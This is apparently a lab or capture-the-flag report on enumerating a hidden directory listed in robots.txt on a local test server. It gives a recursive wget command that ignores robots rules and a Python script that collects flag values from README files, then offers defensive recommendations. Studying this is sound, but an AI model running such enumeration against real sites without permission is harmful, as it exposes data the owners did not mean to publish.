## Laboratory Report: Hidden Directory Enumeration via httrack

### Summary
A vulnerability was discovered by enumerating hidden directories listed in `robots.txt`. Using website mirroring tools and a Python script, sensitive information (flags) was extracted from the hidden content.

### Methodology
1. Identified a hidden folder on the website.
2. Created a local copy of the folder using:
   ```bash
   mkdir website
   cd website
   wget -r -q -nH -e robots=off 'localhost:8080/.hidden/'
   ```
3. Used a Python script to recursively traverse the downloaded directories and extract flag values from `README` files:
   ```python
   import os

   root_dir = os.getcwd() + '/website/.hidden'
   keys = set()

   for dirpath, dirnames, filenames in os.walk(root_dir):
       readme_path = os.path.join(dirpath, 'README')
       if os.path.isfile(readme_path):
           with open(readme_path, 'r', encoding='utf-8') as f:
               keys.add(f.read())

   for key in keys:
       print(key)
   ```

### Findings
- Sensitive information is accessible in hidden directories referenced by `robots.txt`.
- Automated tools can easily enumerate and extract such data.

### Recommendation
- Avoid listing sensitive directories in `robots.txt`.
- Restrict access to hidden content and monitor for unauthorized enumeration.
